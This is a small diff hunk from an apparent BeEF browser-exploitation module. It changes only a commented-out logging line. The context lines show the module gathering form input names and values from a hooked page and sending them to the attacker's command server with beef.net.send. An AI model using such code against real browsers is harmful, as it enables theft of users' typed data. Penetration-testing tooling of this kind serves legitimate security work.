@@ -44,7 +44,7 @@ beef.execute(function() {
 			var val = JSON.stringify({'input':n,'value':v});
 			if (v != "" && !inArray(val,results)){
 				results.push(val);
-				//console.log(val);
+				//beef.debug(val);
 				beef.net.send('<%= @command_url %>', <%= @command_id %>, "results="+val);
 			}
 		}
